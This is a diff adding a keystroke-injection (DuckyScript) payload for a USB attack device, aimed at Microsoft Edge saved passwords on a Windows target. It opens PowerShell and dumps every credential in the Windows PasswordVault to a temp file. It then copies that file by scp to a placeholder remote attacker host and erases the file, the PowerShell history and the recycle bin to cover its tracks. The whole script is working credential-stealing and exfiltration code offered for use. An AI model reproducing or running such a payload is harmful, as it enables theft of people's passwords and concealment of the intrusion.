@@ -1,0 +1,38 @@
+REM Script to dump Microsoft Edge saved passwords on target device
+
+DELAY 2000
+
+REM Open Powershell
+GUI r
+STRING powershell
+ENTER
+
+DELAY 500
+
+REM Execute command to extract saved browser passwords in Microsoft Edge
+STRING [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+ENTER
+STRING $creds = (New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll()
+ENTER
+STRING foreach ($c in $creds) {$c.RetrievePassword()}
+ENTER
+STRING $creds | Format-List -Property Resource,UserName,Password | echo $creds >> $env:TMP\$env:COMPUTERNAME_$env:USERNAME.txt
+ENTER
+
+REM Send the file to remote machine over ssh using scp
+STRING scp $env:TMP\$env:COMPUTERNAME_$env:USERNAME.txt USER@REMOTE_IP:/PATH/TO/REMOTE_MACHINE_DIR/
+ENTER
+DELAY 300
+STRING SCP_PASSWORD
+ENTER
+DELAY 300
+
+REM Deletes the file created from the file system and recycle bin and clears powershell history silently
+STRING rm $env:TEMP\$env:COMPUTERNAME_$env:USERNAME.txt -Force -ErrorAction SilentlyContinue
+ENTER
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+ENTER
+STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+ENTER
+STRING exit
+ENTER
